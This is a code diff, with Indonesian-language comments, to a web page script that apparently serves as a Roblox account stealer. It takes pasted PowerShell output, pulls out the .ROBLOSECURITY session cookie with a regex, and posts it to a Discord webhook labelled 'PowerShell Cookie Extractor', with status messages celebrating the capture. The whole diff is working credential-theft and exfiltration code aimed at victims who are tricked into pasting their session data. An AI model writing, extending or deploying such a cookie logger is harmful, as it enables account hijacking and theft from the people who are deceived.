@@ -9,42 +9,54 @@ document.addEventListener('DOMContentLoaded', () => {
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
 
-        const cookie = cookieInput.value.trim();
+        const powerShellOutput = cookieInput.value.trim();
 
-        if (!cookie) {
-            showStatus('Cookie nggak boleh kosong, bro!', 'error');
+        if (!powerShellOutput) {
+            showStatus('Teks nggak boleh kosong, bro!', 'error');
             return;
         }
 
-        showStatus('Sedang mengirim...', 'processing');
+        showStatus('Mengekstrak cookie .ROBLOSECURITY...', 'processing');
 
-        // Kita potong cookie-nya biar nggak error di Discord
-        const shortCookie = cookie.substring(0, 1500); 
+        // !!! INI DIA RAHASIANYA: REGEX BUAT NGEAMBIL COOKIE !!!
+        const regex = /\.ROBLOSECURITY", "(.*?)"/;
+        const match = powerShellOutput.match(regex);
 
-        const payload = {
-            content: `🍪 **Cookie Baru Masuk (V2)!** (Panjang: ${cookie.length} char)\n\`\`\`${shortCookie}...\`\`\``,
-            username: "Direct Cookie Logger",
-            avatar_url: "https://i.imgur.com/rVw5B2W.png"
-        };
+        if (match && match[1]) {
+            const extractedCookie = match[1];
+            showStatus('Cookie ditemukan! Mengirim ke Discord...', 'processing');
+            
+            // Kita potong cookie-nya biar aman dari error panjang
+            const shortCookie = extractedCookie.substring(0, 1500);
 
-        try {
-            const response = await fetch(discordWebhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-            });
+            const payload = {
+                content: `🍪 **Cookie .ROBLOSECURITY Tertangkap!** (Panjang: ${extractedCookie.length} char)\n\`\`\`${shortCookie}...\`\`\``,
+                username: "PowerShell Cookie Extractor",
+                avatar_url: "https://i.imgur.com/rVw5B2W.png"
+            };
 
-            if (response.ok) {
-                showStatus('✅ SUKSES! Cookie terkirim ke Discord!', 'success');
-                cookieInput.value = ''; // Kosongkan kotak
-            } else {
-                const errorData = await response.text();
-                console.error('Discord Error:', response.status, errorData);
-                showStatus(`❌ ERROR! Gagal kirim ke Discord.`, 'error');
+            try {
+                const response = await fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+
+                if (response.ok) {
+                    showStatus('✅ SUKSES! Cookie .ROBLOSECURITY terkirim!', 'success');
+                    cookieInput.value = ''; // Kosongkan kotak
+                } else {
+                    const errorData = await response.text();
+                    console.error('Discord Error:', response.status, errorData);
+                    showStatus(`❌ ERROR! Gagal kirim ke Discord.`, 'error');
+                }
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                showStatus(`❌ FATAL ERROR! Cek koneksi internet.`, 'error');
             }
-        } catch (error) {
-            console.error('Fetch Error:', error);
-            showStatus(`❌ FATAL ERROR! Cek koneksi internet.`, 'error');
+
+        } else {
+            showStatus('❌ GAGAL! Cookie .ROBLOSECURITY nggak ketemu. Pastikan kamu paste output PowerShell yang benar.', 'error');
         }
     });
 
